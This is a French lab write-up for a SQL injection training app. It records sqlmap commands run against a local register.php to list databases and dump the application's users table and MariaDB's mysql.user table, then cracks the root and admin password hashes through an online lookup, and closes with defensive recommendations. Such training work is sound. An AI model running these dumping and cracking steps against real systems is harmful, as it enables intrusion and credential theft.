# 🛡️ SQL Injection Training App - Rapport 🛡️

<div align="center">

![SQL Injection](https://evalian.co.uk/wp-content/uploads/2022/04/XSS-Attacks.png)

</div>


---

## 📋 Objectif

Ce projet a pour but de démontrer l'exploitation de vulnérabilités d'injection SQL dans une application web. Les objectifs spécifiques sont :

1. [**Extraire le schéma de la base de données**](information_schema) et le sauvegarder dans un fichier `.csv`.
2. [**Lister les utilisateurs de l'application**](sqlitraining/users.csv) et les sauvegarder dans un fichier `.csv`.
3. [**Lister les utilisateurs de MariaDB**](mysql/user.csv) et les sauvegarder dans un fichier `.csv`.
4. **Obtenir et documenter le mot de passe de l'utilisateur root de MariaDB** par force brute.
   
---

## 🛠️ Pré-requis

- **sqlmap** : Outil puissant pour automatiser la détection et l'exploitation des vulnérabilités d'injection SQL.
- **MariaDB** : Système de gestion de base de données utilisé par l'application cible.
- **Accès à l'application web vulnérable**.

---

## 🚀 Étapes Réalisées

### 1. 🔍 Identification des Vulnérabilités d'Injection SQL

En testant les champs du formulaire `register.php` avec une apostrophe (`'`), une erreur SQL a été générée, révélant l'utilisation de MariaDB. Cela a indiqué une potentielle vulnérabilité d'injection SQL.

**erreur :**

```
Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'd41d8cd98f00b204e9800998ecf8427e','','')' at line 1
```

---

### 2. 🗄️ Extraction du Schéma de la Base de Données

**Commande utilisée :**

```bash
sqlmap -u "http://localhost:8888/register.php" \
       --data="uid=test&password=test&name=test&descr=test" \
       --dbs --batch
```

**Bases de données identifiées :**

- `information_schema`
- `mysql`
- `performance_schema`
- `sqlitraining`
- `sys`

Nous avons ciblé la base de données `sqlitraining` pour extraire son schéma.

**Extraction des tables de `sqlitraining` :**

```bash
sqlmap -u "http://localhost:8888/register.php" \
       --data="uid=test&password=test&name=test&descr=test" \
       -D sqlitraining --tables --batch
```

**Tables trouvées :**

- [`products`](sqlitraining/products.csv)
- [`users`](sqlitraining/users.csv)

**Dump du schéma dans un fichier `.csv` :**

```bash
sqlmap -u "http://localhost:8888/register.php" \
       --data="uid=test&password=test&name=test&descr=test" \
       -D sqlitraining --dump --dump-format=CSV --batch
```

---

### 3. 👥 Liste des Utilisateurs de l'Application

En ciblant la table `users` de la base `sqlitraining`, nous avons extrait les utilisateurs de l'application.

**Commande :**

```bash
sqlmap -u "http://localhost:8888/register.php" \
       --data="uid=test&password=test&name=test&descr=test" \
       -D sqlitraining -T users --dump --dump-format=CSV --batch
```


---

### 4. 🗝️ Liste des Utilisateurs de MariaDB

Nous avons ciblé la base de données `mysql`, qui contient les informations des utilisateurs de MariaDB.

**Commande :**

```bash
sqlmap -u "http://localhost:8888/register.php" \
       --data="uid=test&password=test&name=test&descr=test" \
       -D mysql -T user --dump --dump-format=CSV --batch
```

**Résultat :**

La liste des utilisateurs de MariaDB a été extraite et sauvegardée dans `users.csv`.

---

### 5. 🔐 Récupération du Mot de Passe de l'Utilisateur Root de MariaDB

En analysant les données extraites, nous avons récupéré le hachage du mot de passe de l'utilisateur `root`.

**Hachage récupéré :**

```
81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
```

**Déchiffrement du hachage :**

Nous avons utilisé [CrackStation](https://crackstation.net/) pour déchiffrer le hachage.

**Mot de passe obtenu :**

```
root
```

*Le mot de passe est étonnamment simple, ce qui souligne l'importance d'utiliser des mots de passe forts.*

---

### 6. 🏆 Challenge 2 : Récupération du Mot de Passe de l'Administrateur de l'Application

En examinant la table `users`, nous avons identifié l'utilisateur administrateur.

**Commande :**

```bash
sqlmap -u "http://localhost:8888/register.php" \
       --data="uid=test&password=test&name=test&descr=test" \
       -D sqlitraining -T users --dump --dump-format=CSV --batch
```

**Mot de passe de l'administrateur :**

```
admin
```

le mot de passe est encoder en **MD5** (21232f297a57a5a743894a0e4a801fc3), il nous suffit de prendre le hash et de le mettre sur crackstations.

*Encore une fois, un mot de passe faible qui peut être facilement compromis.*

---

## 📊 Résumé des Résultats

| Objectif                                                       | Statut    |
|---------------------------------------------------------------|-----------|
| Extraction du schéma de la base de données                    | ✅ Réussi |
| Liste des utilisateurs de l'application                       | ✅ Réussi |
| Liste des utilisateurs de MariaDB                             | ✅ Réussi |
| Récupération du mot de passe root de MariaDB                  | ✅ Réussi |
| Challenge 2 : Mot de passe de l'administrateur de l'application | ✅ Réussi |

---

## 🔒 Conclusion et Recommandations

Cette exploitation démontre à quel point les applications web peuvent être vulnérables aux attaques par injection SQL si elles ne sont pas correctement sécurisées.

**Recommandations :**

- **Utiliser des requêtes préparées** : Éviter les concaténations de chaînes pour construire des requêtes SQL.
- **Valider et assainir toutes les entrées utilisateur** : Utiliser des fonctions d'échappement et de validation.
- **Mots de passe forts** : Toujours utiliser des mots de passe complexes et uniques pour les utilisateurs et les administrateurs.
- **Mises à jour régulières** : Garder les systèmes et les applications à jour avec les derniers correctifs de sécurité.
- **Limiter les privilèges** : Les utilisateurs ne devraient avoir que les privilèges nécessaires pour accomplir leurs tâches.

